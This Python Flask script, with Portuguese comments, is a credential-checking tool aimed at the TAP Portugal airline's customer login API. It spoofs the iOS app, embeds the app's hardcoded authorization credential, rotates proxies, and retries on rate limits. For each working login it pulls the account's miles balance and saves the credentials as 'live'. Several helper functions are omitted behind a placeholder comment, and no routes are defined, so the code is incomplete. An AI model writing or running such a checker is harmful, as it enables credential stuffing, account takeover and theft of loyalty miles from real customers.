from flask import Flask, request, jsonify
import pycurl
import json
import random
import string
from io import BytesIO
import re
from threading import Lock
import time
import certifi  # Adicionado para melhor suporte SSL

app = Flask(__name__)

# Variáveis globais para contagem
live_count = 0
die_count = 0
count_lock = Lock()
file_lock = Lock()

# Configurações específicas para Ubuntu
USER_AGENT = "TAP Portugal iOS/4.11.4 (iPhone; iOS 15.6; Scale/3.00)"
CA_BUNDLE = certifi.where()  # Caminho para certificados CA confiáveis

def setup_curl(curl):
    """Configurações comuns para o pycurl"""
    curl.setopt(pycurl.SSL_VERIFYPEER, 1)
    curl.setopt(pycurl.SSL_VERIFYHOST, 2)
    curl.setopt(pycurl.CAINFO, CA_BUNDLE)
    curl.setopt(pycurl.FOLLOWLOCATION, 1)
    curl.setopt(pycurl.MAXREDIRS, 5)
    curl.setopt(pycurl.USERAGENT, USER_AGENT)
    curl.setopt(pycurl.ENCODING, 'gzip, deflate')

def buscar_milhas(customer_id, x_auth):
    url = f"https://rest-customer.tap.pt/v2/customer-services/customers/{customer_id}?PurposeCode=TAPPPREAD&PurposeVersion=1.0&PurposeSystemID=DIG"
    
    headers = [
        f"Host: rest-customer.tap.pt",
        f"x-auth: {x_auth}",
        "accept: */*",
        "accept-language: pt-BR;q=1.0, pt;q=0.9",
        "authorization: Basic dGFwLm1vYmlsZTpiM25YM1c5RFVUamtId2Q1WnI2UnV2eVZFN05oWkF3WjJYM0JVemdI"
    ]

    response_buffer = BytesIO()
    curl = pycurl.Curl()
    setup_curl(curl)
    
    try:
        curl.setopt(pycurl.URL, url)
        curl.setopt(pycurl.HTTPHEADER, headers)
        curl.setopt(pycurl.WRITEDATA, response_buffer)
        
        curl.perform()
        
        http_status = curl.getinfo(pycurl.RESPONSE_CODE)
        if http_status == 200:
            response_body = response_buffer.getvalue().decode('utf-8')
            data = json.loads(response_body)
            return data.get("FrequentFlyerProgram", {}).get("TotalMiles", 0)
        return 0
    except Exception as e:
        print(f"\033[91mErro ao buscar milhas: {e}\033[0m")
        return 0
    finally:
        curl.close()

def verificar_credencial(username, password, proxy=None):
    tentativas = 0
    max_tentativas = 3
    
    while tentativas < max_tentativas:
        tentativas += 1
        
        headers = [
            "Host: rest-customer.tap.pt",
            "accept: */*",
            "content-type: application/json",
            "accept-language: pt-BR;q=1.0",
            "application: tap.mobile.ios",
            "authorization: Basic dGFwLm1vYmlsZTpiM25YM1c5RFVUamtId2Q1WnI2UnV2eVZFN05oWkF3WjJYM0JVemdI"
        ]

        data = {
            "Customer": {
                "Password": password,
                "ProviderType": "TP",
                "Username": username
            }
        }

        response_buffer = BytesIO()
        header_buffer = BytesIO()
        curl = pycurl.Curl()
        setup_curl(curl)
        
        try:
            curl.setopt(pycurl.URL, "https://rest-customer.tap.pt/v2/customer-services/customers-login?PurposeSystemID=DIG&PurposeCode=TAPPPREAD&PurposeVersion=1.0")
            curl.setopt(pycurl.HTTPHEADER, headers)
            curl.setopt(pycurl.POST, 1)
            curl.setopt(pycurl.POSTFIELDS, json.dumps(data))
            curl.setopt(pycurl.WRITEDATA, response_buffer)
            curl.setopt(pycurl.HEADERFUNCTION, header_buffer.write)
            curl.setopt(pycurl.TIMEOUT, 30)
            curl.setopt(pycurl.CONNECTTIMEOUT, 15)

            if proxy:
                configurar_proxy(curl, proxy)

            curl.perform()

            http_status = curl.getinfo(pycurl.RESPONSE_CODE)
            if http_status == 200:
                response_body = response_buffer.getvalue().decode('utf-8')
                response_headers = header_buffer.getvalue().decode('utf-8')

                customer_id = json.loads(response_body).get("Customer", {}).get("CustomerID")
                x_auth_match = re.search(r"x-auth:\s*(Bearer\s\S+)", response_headers, re.IGNORECASE)
                x_auth = x_auth_match.group(1) if x_auth_match else None

                if customer_id and x_auth:
                    miles = buscar_milhas(customer_id, x_auth)
                    salvar_live(username, password, miles)
                    incrementar_live()
                    return {"status": "live", "username": username, "miles": miles}
            
            elif http_status == 429:
                time.sleep(2)
                continue
            
            return {"status": "die", "username": username, "code": http_status}
            
        except pycurl.error as e:
            errno, errstr = e.args
            print(f"\033[91mErro cURL ({errno}): {errstr}\033[0m")
            if tentativas == max_tentativas:
                return {"status": "error", "message": f"cURL error: {errstr}"}
        except Exception as e:
            print(f"\033[91mErro inesperado: {str(e)}\033[0m")
            if tentativas == max_tentativas:
                return {"status": "error", "message": str(e)}
        finally:
            curl.close()
        
        time.sleep(1)

# ... (mantenha as outras funções como configurar_proxy, salvar_live, etc)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, threaded=True)
